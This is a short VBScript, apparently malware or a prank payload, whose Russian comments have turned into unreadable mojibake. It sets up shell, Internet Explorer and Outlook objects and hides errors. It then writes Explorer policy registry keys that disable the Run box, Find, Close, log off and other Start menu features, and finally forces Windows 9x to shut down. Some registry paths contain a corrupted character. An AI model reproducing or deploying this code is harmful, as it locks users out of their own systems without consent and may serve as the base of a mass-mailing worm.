'            = = = = = =  = > ��� ������ < = = = = = = = 

'      ���������� ����������(���� ����� �� ����������)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


' �������� ������� ���� ����: ���������, ���������� ������, �����, ���������, ��������� � �.�.
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoStartMenuMorePrograms", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoClose", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoFind", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoRun", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoRecentDocsMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoFavoritesMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoStartMenuLogoff", 1, "REG_DWORD"

'     ������������� ���������(������ ��� Windows 95,98,Me)
Shell.Run "Rundll32.exe User.exe,ExitWindows"

